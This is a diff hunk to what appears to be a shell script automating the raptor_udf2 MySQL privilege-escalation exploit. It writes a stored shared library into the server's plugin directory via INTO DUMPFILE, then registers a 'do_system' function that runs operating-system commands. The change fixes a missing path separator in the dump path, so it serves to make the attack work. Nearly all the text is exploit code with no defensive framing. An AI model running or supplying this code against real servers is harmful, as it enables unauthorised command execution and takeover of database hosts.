@@ -78,7 +78,7 @@ mysql --defaults-extra-file=/tmp/my.cnf --database=$DATABASE -e "INSERT INTO MyS
 ## -- SELECT @@GLOBAL.plugin_dir;
 ## -- SELECT line FROM MySQLPrvSc INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
 ##
-mysql --defaults-extra-file=/tmp/my.cnf --database=$DATABASE -e "SET @raptor_query = CONCAT('SELECT line FROM MySQLPrvSc INTO DUMPFILE ', 0x27, @@GLOBAL.plugin_dir,'raptor_udf2.so', 0x27); PREPARE raptor FROM @raptor_query; EXECUTE raptor; DEALLOCATE PREPARE raptor" 2>&1
+mysql --defaults-extra-file=/tmp/my.cnf --database=$DATABASE -e "SET @raptor_query = CONCAT('SELECT line FROM MySQLPrvSc INTO DUMPFILE ', 0x27, @@GLOBAL.plugin_dir, 0x2F,'raptor_udf2.so', 0x27); PREPARE raptor FROM @raptor_query; EXECUTE raptor; DEALLOCATE PREPARE raptor" 2>&1
 mysql --defaults-extra-file=/tmp/my.cnf --database=$DATABASE -e "DROP TABLE IF EXISTS MySQLPrvSc"
 ##
 ## -- CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
